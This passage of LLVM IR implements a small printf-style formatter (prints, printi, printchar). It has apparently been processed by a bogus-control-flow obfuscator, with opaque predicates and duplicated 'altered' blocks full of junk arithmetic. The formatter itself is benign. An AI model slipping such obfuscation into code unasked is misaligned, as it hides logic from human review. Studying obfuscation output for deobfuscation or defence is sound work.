  %621 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %384, i32 0, i32 3
  %622 = load i8*, i8** %621, align 8
  %623 = getelementptr i8, i8* %622, i32 %386
  %624 = bitcast i8* %623 to i32*
  %_76 = sub i32 %386, 8
  %gen77 = mul i32 %_76, 8
  %_78 = sub i32 %386, 8
  %gen79 = mul i32 %_78, 8
  %_80 = sub i32 %386, 8
  %gen81 = mul i32 %_80, 8
  %625 = add i32 %386, 8
  store i32 %625, i32* %385, align 8
  br label %originalBB75

originalBB85alteredBB:                            ; preds = %originalBB85, %418
  %626 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %384, i32 0, i32 2
  %627 = load i8*, i8** %626, align 8
  %628 = bitcast i8* %627 to i32*
  %629 = getelementptr i8, i8* %627, i32 8
  store i8* %629, i8** %626, align 8
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %439
  %630 = load i32, i32* %440, align 4
  %631 = load i32, i32* %15, align 4
  %632 = load i32, i32* %16, align 4
  %633 = call i32 @printi(i8** %383, i32 %630, i32 10, i32 0, i32 %631, i32 %632, i32 97)
  %634 = load i32, i32* %17, align 4
  %_90 = shl i32 %634, %633
  %_91 = sub i32 0, %634
  %gen92 = add i32 %_91, %633
  %_93 = sub i32 0, %634
  %gen94 = add i32 %_93, %633
  %_95 = shl i32 %634, %633
  %635 = add nsw i32 %634, %633
  store i32 %635, i32* %17, align 4
  br label %originalBB89

originalBB99alteredBB:                            ; preds = %originalBB99, %499
  %636 = load i8**, i8*** %12, align 8
  %637 = load i8*, i8** %13, align 8
  %638 = load i8, i8* %637, align 1
  %639 = zext i8 %638 to i32
  call void @printchar(i8** %636, i32 %639)
  %640 = load i32, i32* %17, align 4
  %_100 = shl i32 %640, 1
  %_101 = shl i32 %640, 1
  %_102 = sub i32 0, %640
  %gen103 = add i32 %_102, 1
  %_104 = shl i32 %640, 1
  %_105 = sub i32 0, %640
  %gen106 = add i32 %_105, 1
  %641 = add nsw i32 %640, 1
  store i32 %641, i32* %17, align 4
  br label %originalBB99

originalBB110alteredBB:                           ; preds = %originalBB110, %523
  %642 = load i8*, i8** %13, align 8
  %643 = getelementptr inbounds i8, i8* %642, i32 1
  store i8* %643, i8** %13, align 8
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %548
  %644 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %645 = bitcast %struct.__va_list_tag* %644 to i8*
  call void @llvm.va_end(i8* %645)
  %646 = load i32, i32* %17, align 4
  br label %originalBB114
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = load i32, i32* @x.9
  %6 = load i32, i32* @y.10
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8**, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  store i8** %0, i8*** %13, align 8
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  store i32 %3, i32* %16, align 4
  store i32 0, i32* %17, align 4
  store i32 32, i32* %18, align 4
  %21 = load i32, i32* %15, align 4
  %22 = icmp sgt i32 %21, 0
  %23 = load i32, i32* @x.9
  %24 = load i32, i32* @y.10
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %90

; <label>:31:                                     ; preds = %originalBBpart2
  store i32 0, i32* %19, align 4
  %32 = load i8*, i8** %14, align 8
  store i8* %32, i8** %20, align 8
  br label %33

; <label>:33:                                     ; preds = %40, %31
  %34 = load i8*, i8** %20, align 8
  %35 = load i8, i8* %34, align 1
  %36 = icmp ne i8 %35, 0
  br i1 %36, label %37, label %43

; <label>:37:                                     ; preds = %33
  %38 = load i32, i32* %19, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %19, align 4
  br label %40

; <label>:40:                                     ; preds = %37
  %41 = load i8*, i8** %20, align 8
  %42 = getelementptr inbounds i8, i8* %41, i32 1
  store i8* %42, i8** %20, align 8
  br label %33

; <label>:43:                                     ; preds = %33
  %44 = load i32, i32* %19, align 4
  %45 = load i32, i32* %15, align 4
  %46 = icmp sge i32 %44, %45
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %43
  store i32 0, i32* %15, align 4
  br label %68

; <label>:48:                                     ; preds = %43
  %49 = load i32, i32* @x.9
  %50 = load i32, i32* @y.10
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %48
  %57 = load i32, i32* %19, align 4
  %58 = load i32, i32* %15, align 4
  %59 = sub nsw i32 %58, %57
  store i32 %59, i32* %15, align 4
  %60 = load i32, i32* @x.9
  %61 = load i32, i32* @y.10
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart215, label %originalBB1alteredBB

originalBBpart215:                                ; preds = %originalBB1
  br label %68

; <label>:68:                                     ; preds = %originalBBpart215, %47
  %69 = load i32, i32* @x.9
  %70 = load i32, i32* @y.10
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %68
  %77 = load i32, i32* %16, align 4
  %78 = and i32 %77, 2
  %79 = icmp ne i32 %78, 0
  %80 = load i32, i32* @x.9
  %81 = load i32, i32* @y.10
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart234, label %originalBB17alteredBB

originalBBpart234:                                ; preds = %originalBB17
  br i1 %79, label %88, label %89

; <label>:88:                                     ; preds = %originalBBpart234
  store i32 48, i32* %18, align 4
  br label %89

; <label>:89:                                     ; preds = %88, %originalBBpart234
  br label %90

; <label>:90:                                     ; preds = %89, %originalBBpart2
  %91 = load i32, i32* %16, align 4
  %92 = and i32 %91, 1
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %139, label %94

; <label>:94:                                     ; preds = %90
  br label %95

; <label>:95:                                     ; preds = %originalBBpart240, %94
  %96 = load i32, i32* %15, align 4
  %97 = icmp sgt i32 %96, 0
  br i1 %97, label %98, label %122

; <label>:98:                                     ; preds = %95
  %99 = load i8**, i8*** %13, align 8
  %100 = load i32, i32* %18, align 4
  call void @printchar(i8** %99, i32 %100)
  %101 = load i32, i32* %17, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %17, align 4
  br label %103

; <label>:103:                                    ; preds = %98
  %104 = load i32, i32* @x.9
  %105 = load i32, i32* @y.10
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %103
  %112 = load i32, i32* %15, align 4
  %113 = add nsw i32 %112, -1
  store i32 %113, i32* %15, align 4
  %114 = load i32, i32* @x.9
  %115 = load i32, i32* @y.10
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart240, label %originalBB36alteredBB

originalBBpart240:                                ; preds = %originalBB36
  br label %95

; <label>:122:                                    ; preds = %95
  %123 = load i32, i32* @x.9
  %124 = load i32, i32* @y.10
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %122
  %131 = load i32, i32* @x.9
  %132 = load i32, i32* @y.10
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %139

; <label>:139:                                    ; preds = %originalBBpart244, %90
  br label %140

; <label>:140:                                    ; preds = %originalBBpart248, %139
  %141 = load i8*, i8** %14, align 8
  %142 = load i8, i8* %141, align 1
  %143 = icmp ne i8 %142, 0
  br i1 %143, label %144, label %170

; <label>:144:                                    ; preds = %140
  %145 = load i8**, i8*** %13, align 8
  %146 = load i8*, i8** %14, align 8
  %147 = load i8, i8* %146, align 1
  %148 = zext i8 %147 to i32
  call void @printchar(i8** %145, i32 %148)
  %149 = load i32, i32* %17, align 4
  %150 = add nsw i32 %149, 1
  store i32 %150, i32* %17, align 4
  br label %151

; <label>:151:                                    ; preds = %144
  %152 = load i32, i32* @x.9
  %153 = load i32, i32* @y.10
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %151
  %160 = load i8*, i8** %14, align 8
  %161 = getelementptr inbounds i8, i8* %160, i32 1
  store i8* %161, i8** %14, align 8
  %162 = load i32, i32* @x.9
  %163 = load i32, i32* @y.10
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %140

; <label>:170:                                    ; preds = %140
  br label %171

; <label>:171:                                    ; preds = %originalBBpart252, %170
  %172 = load i32, i32* %15, align 4
  %173 = icmp sgt i32 %172, 0
  br i1 %173, label %174, label %198

; <label>:174:                                    ; preds = %171
  %175 = load i8**, i8*** %13, align 8
  %176 = load i32, i32* %18, align 4
  call void @printchar(i8** %175, i32 %176)
  %177 = load i32, i32* %17, align 4
  %178 = add nsw i32 %177, 1
  store i32 %178, i32* %17, align 4
  br label %179

; <label>:179:                                    ; preds = %174
  %180 = load i32, i32* @x.9
  %181 = load i32, i32* @y.10
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %179
  %188 = load i32, i32* %15, align 4
  %189 = add nsw i32 %188, -1
  store i32 %189, i32* %15, align 4
  %190 = load i32, i32* @x.9
  %191 = load i32, i32* @y.10
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %171

; <label>:198:                                    ; preds = %171
  %199 = load i32, i32* %17, align 4
  ret i32 %199

originalBBalteredBB:                              ; preds = %originalBB, %4
  %200 = alloca i8**, align 8
  %201 = alloca i8*, align 8
  %202 = alloca i32, align 4
  %203 = alloca i32, align 4
  %204 = alloca i32, align 4
  %205 = alloca i32, align 4
  %206 = alloca i32, align 4
  %207 = alloca i8*, align 8
  store i8** %0, i8*** %200, align 8
  store i8* %1, i8** %201, align 8
  store i32 %2, i32* %202, align 4
  store i32 %3, i32* %203, align 4
  store i32 0, i32* %204, align 4
  store i32 32, i32* %205, align 4
  %208 = load i32, i32* %202, align 4
  %209 = icmp sgt i32 %208, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %48
  %210 = load i32, i32* %19, align 4
  %211 = load i32, i32* %15, align 4
  %_ = shl i32 %211, %210
  %_2 = sub i32 %211, %210
  %gen = mul i32 %_2, %210
  %_3 = sub i32 0, %211
  %gen4 = add i32 %_3, %210
  %_5 = shl i32 %211, %210
  %_6 = sub i32 0, %211
  %gen7 = add i32 %_6, %210
  %_8 = sub i32 0, %211
  %gen9 = add i32 %_8, %210
  %_10 = sub i32 0, %211
  %gen11 = add i32 %_10, %210
  %_12 = sub i32 %211, %210
  %gen13 = mul i32 %_12, %210
  %212 = sub nsw i32 %211, %210
  store i32 %212, i32* %15, align 4
  br label %originalBB1

originalBB17alteredBB:                            ; preds = %originalBB17, %68
  %213 = load i32, i32* %16, align 4
  %_18 = sub i32 0, %213
  %gen19 = add i32 %_18, 2
  %_20 = sub i32 0, %213
  %gen21 = add i32 %_20, 2
  %_22 = sub i32 %213, 2
  %gen23 = mul i32 %_22, 2
  %_24 = shl i32 %213, 2
  %_25 = sub i32 %213, 2
  %gen26 = mul i32 %_25, 2
  %_27 = sub i32 0, %213
  %gen28 = add i32 %_27, 2
  %_29 = sub i32 0, %213
  %gen30 = add i32 %_29, 2
  %_31 = sub i32 0, %213
  %gen32 = add i32 %_31, 2
  %214 = and i32 %213, 2
  %215 = icmp ne i32 %214, 0
  br label %originalBB17

originalBB36alteredBB:                            ; preds = %originalBB36, %103
  %216 = load i32, i32* %15, align 4
  %_37 = sub i32 %216, -1
  %gen38 = mul i32 %_37, -1
  %217 = add nsw i32 %216, -1
  store i32 %217, i32* %15, align 4
  br label %originalBB36

originalBB42alteredBB:                            ; preds = %originalBB42, %122
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %151
  %218 = load i8*, i8** %14, align 8
  %219 = getelementptr inbounds i8, i8* %218, i32 1
  store i8* %219, i8** %14, align 8
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %179
  %220 = load i32, i32* %15, align 4
  %221 = add nsw i32 %220, -1
  store i32 %221, i32* %15, align 4
  br label %originalBB50
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = load i32, i32* @x.11
  %9 = load i32, i32* @y.12
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = alloca i32, align 4
  %17 = alloca i8**, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca [12 x i8], align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  store i8** %0, i8*** %17, align 8
  store i32 %1, i32* %18, align 4
  store i32 %2, i32* %19, align 4
  store i32 %3, i32* %20, align 4
  store i32 %4, i32* %21, align 4
  store i32 %5, i32* %22, align 4
  store i32 %6, i32* %23, align 4
  store i32 0, i32* %27, align 4
  store i32 0, i32* %28, align 4
  %30 = load i32, i32* %18, align 4
  store i32 %30, i32* %29, align 4
  %31 = load i32, i32* %18, align 4
  %32 = icmp eq i32 %31, 0
  %33 = load i32, i32* @x.11
  %34 = load i32, i32* @y.12
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %32, label %41, label %49

; <label>:41:                                     ; preds = %originalBBpart2
  %42 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 0
  store i8 48, i8* %42, align 1
  %43 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 1
  store i8 0, i8* %43, align 1
  %44 = load i8**, i8*** %17, align 8
  %45 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %46 = load i32, i32* %21, align 4
  %47 = load i32, i32* %22, align 4
  %48 = call i32 @prints(i8** %44, i8* %45, i32 %46, i32 %47)
  store i32 %48, i32* %16, align 4
  br label %198

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = load i32, i32* %20, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %52, label %77

; <label>:52:                                     ; preds = %49
  %53 = load i32, i32* %19, align 4
  %54 = icmp eq i32 %53, 10
  br i1 %54, label %55, label %77

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* @x.11
  %57 = load i32, i32* @y.12
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = load i32, i32* %18, align 4
  %65 = icmp slt i32 %64, 0
  %66 = load i32, i32* @x.11
  %67 = load i32, i32* @y.12
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %65, label %74, label %77

; <label>:74:                                     ; preds = %originalBBpart24
  store i32 1, i32* %27, align 4
  %75 = load i32, i32* %18, align 4
  %76 = sub nsw i32 0, %75
  store i32 %76, i32* %29, align 4
  br label %77

; <label>:77:                                     ; preds = %74, %originalBBpart24, %52, %49
  %78 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %79 = getelementptr inbounds i8, i8* %78, i64 12
  %80 = getelementptr inbounds i8, i8* %79, i64 -1
  store i8* %80, i8** %25, align 8
  %81 = load i8*, i8** %25, align 8
  store i8 0, i8* %81, align 1
  br label %82

; <label>:82:                                     ; preds = %129, %77
  %83 = load i32, i32* @x.11
  %84 = load i32, i32* @y.12
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %82
  %91 = load i32, i32* %29, align 4
  %92 = icmp ne i32 %91, 0
  %93 = load i32, i32* @x.11
  %94 = load i32, i32* @y.12
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %92, label %101, label %138

; <label>:101:                                    ; preds = %originalBBpart28
  %102 = load i32, i32* @x.11
  %103 = load i32, i32* @y.12
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %101
  %110 = load i32, i32* %29, align 4
  %111 = load i32, i32* %19, align 4
  %112 = urem i32 %110, %111
  store i32 %112, i32* %26, align 4
  %113 = load i32, i32* %26, align 4
  %114 = icmp sge i32 %113, 10
  %115 = load i32, i32* @x.11
  %116 = load i32, i32* @y.12
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart213, label %originalBB10alteredBB

originalBBpart213:                                ; preds = %originalBB10
  br i1 %114, label %123, label %129

; <label>:123:                                    ; preds = %originalBBpart213
  %124 = load i32, i32* %23, align 4
  %125 = sub nsw i32 %124, 48
  %126 = sub nsw i32 %125, 10
  %127 = load i32, i32* %26, align 4
  %128 = add nsw i32 %127, %126
  store i32 %128, i32* %26, align 4
  br label %129

; <label>:129:                                    ; preds = %123, %originalBBpart213
  %130 = load i32, i32* %26, align 4
  %131 = add nsw i32 %130, 48
  %132 = trunc i32 %131 to i8
  %133 = load i8*, i8** %25, align 8
  %134 = getelementptr inbounds i8, i8* %133, i32 -1
  store i8* %134, i8** %25, align 8
  store i8 %132, i8* %134, align 1
  %135 = load i32, i32* %19, align 4
  %136 = load i32, i32* %29, align 4
  %137 = udiv i32 %136, %135
  store i32 %137, i32* %29, align 4
  br label %82

; <label>:138:                                    ; preds = %originalBBpart28
  %139 = load i32, i32* %27, align 4
  %140 = icmp ne i32 %139, 0
  br i1 %140, label %141, label %174

; <label>:141:                                    ; preds = %138
  %142 = load i32, i32* %21, align 4
  %143 = icmp ne i32 %142, 0
  br i1 %143, label %144, label %170

; <label>:144:                                    ; preds = %141
  %145 = load i32, i32* %22, align 4
  %146 = and i32 %145, 2
  %147 = icmp ne i32 %146, 0
  br i1 %147, label %148, label %170

; <label>:148:                                    ; preds = %144
  %149 = load i32, i32* @x.11
  %150 = load i32, i32* @y.12
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %148
  %157 = load i8**, i8*** %17, align 8
  call void @printchar(i8** %157, i32 45)
  %158 = load i32, i32* %28, align 4
  %159 = add nsw i32 %158, 1
  store i32 %159, i32* %28, align 4
  %160 = load i32, i32* %21, align 4
  %161 = add nsw i32 %160, -1
  store i32 %161, i32* %21, align 4
  %162 = load i32, i32* @x.11
  %163 = load i32, i32* @y.12
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart235, label %originalBB15alteredBB

originalBBpart235:                                ; preds = %originalBB15
  br label %173

; <label>:170:                                    ; preds = %144, %141
  %171 = load i8*, i8** %25, align 8
  %172 = getelementptr inbounds i8, i8* %171, i32 -1
  store i8* %172, i8** %25, align 8
  store i8 45, i8* %172, align 1
  br label %173

; <label>:173:                                    ; preds = %170, %originalBBpart235
  br label %174

; <label>:174:                                    ; preds = %173, %138
  %175 = load i32, i32* @x.11
  %176 = load i32, i32* @y.12
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %174
  %183 = load i32, i32* %28, align 4
  %184 = load i8**, i8*** %17, align 8
  %185 = load i8*, i8** %25, align 8
  %186 = load i32, i32* %21, align 4
  %187 = load i32, i32* %22, align 4
  %188 = call i32 @prints(i8** %184, i8* %185, i32 %186, i32 %187)
  %189 = add nsw i32 %183, %188
  store i32 %189, i32* %16, align 4
  %190 = load i32, i32* @x.11
  %191 = load i32, i32* @y.12
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart243, label %originalBB37alteredBB

originalBBpart243:                                ; preds = %originalBB37
  br label %198

; <label>:198:                                    ; preds = %originalBBpart243, %41
  %199 = load i32, i32* %16, align 4
  ret i32 %199

originalBBalteredBB:                              ; preds = %originalBB, %7
  %200 = alloca i32, align 4
  %201 = alloca i8**, align 8
  %202 = alloca i32, align 4
  %203 = alloca i32, align 4
  %204 = alloca i32, align 4
  %205 = alloca i32, align 4
  %206 = alloca i32, align 4
  %207 = alloca i32, align 4
  %208 = alloca [12 x i8], align 1
  %209 = alloca i8*, align 8
  %210 = alloca i32, align 4
  %211 = alloca i32, align 4
  %212 = alloca i32, align 4
  %213 = alloca i32, align 4
  store i8** %0, i8*** %201, align 8
  store i32 %1, i32* %202, align 4
  store i32 %2, i32* %203, align 4
  store i32 %3, i32* %204, align 4
  store i32 %4, i32* %205, align 4
  store i32 %5, i32* %206, align 4
  store i32 %6, i32* %207, align 4
  store i32 0, i32* %211, align 4
  store i32 0, i32* %212, align 4
  %214 = load i32, i32* %202, align 4
  store i32 %214, i32* %213, align 4
  %215 = load i32, i32* %202, align 4
  %216 = icmp eq i32 %215, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %217 = load i32, i32* %18, align 4
  %218 = icmp slt i32 %217, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %82
  %219 = load i32, i32* %29, align 4
  %220 = icmp ne i32 %219, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %101
  %221 = load i32, i32* %29, align 4
  %222 = load i32, i32* %19, align 4
  %_ = sub i32 %221, %222
  %gen = mul i32 %_, %222
  %_11 = shl i32 %221, %222
  %223 = urem i32 %221, %222
  store i32 %223, i32* %26, align 4
  %224 = load i32, i32* %26, align 4
  %225 = icmp sge i32 %224, 10
  br label %originalBB10

originalBB15alteredBB:                            ; preds = %originalBB15, %148
  %226 = load i8**, i8*** %17, align 8
  call void @printchar(i8** %226, i32 45)
  %227 = load i32, i32* %28, align 4
  %_16 = sub i32 %227, 1
  %gen17 = mul i32 %_16, 1
  %_18 = sub i32 0, %227
  %gen19 = add i32 %_18, 1
  %_20 = shl i32 %227, 1
  %_21 = sub i32 0, %227
  %gen22 = add i32 %_21, 1
  %_23 = sub i32 0, %227
  %gen24 = add i32 %_23, 1
  %228 = add nsw i32 %227, 1
  store i32 %228, i32* %28, align 4
  %229 = load i32, i32* %21, align 4
  %_25 = shl i32 %229, -1
  %_26 = sub i32 0, %229
  %gen27 = add i32 %_26, -1
  %_28 = sub i32 %229, -1
  %gen29 = mul i32 %_28, -1
  %_30 = sub i32 %229, -1
  %gen31 = mul i32 %_30, -1
  %_32 = sub i32 0, %229
  %gen33 = add i32 %_32, -1
  %230 = add nsw i32 %229, -1
  store i32 %230, i32* %21, align 4
  br label %originalBB15

originalBB37alteredBB:                            ; preds = %originalBB37, %174
  %231 = load i32, i32* %28, align 4
  %232 = load i8**, i8*** %17, align 8
  %233 = load i8*, i8** %25, align 8
  %234 = load i32, i32* %21, align 4
  %235 = load i32, i32* %22, align 4
  %236 = call i32 @prints(i8** %232, i8* %233, i32 %234, i32 %235)
  %_38 = sub i32 %231, %236
  %gen39 = mul i32 %_38, %236
  %_40 = sub i32 0, %231
  %gen41 = add i32 %_40, %236
  %237 = add nsw i32 %231, %236
  store i32 %237, i32* %16, align 4
  br label %originalBB37
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %34

; <label>:15:                                     ; preds = %2
  %16 = load i32, i32* @x.13
  %17 = load i32, i32* @y.14
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  %24 = bitcast i32* %4 to i8*
  %25 = call i64 @write(i32 1, i8* %24, i64 1)
  %26 = load i32, i32* @x.13
  %27 = load i32, i32* @y.14
  %28 = sub i32 %26, 1
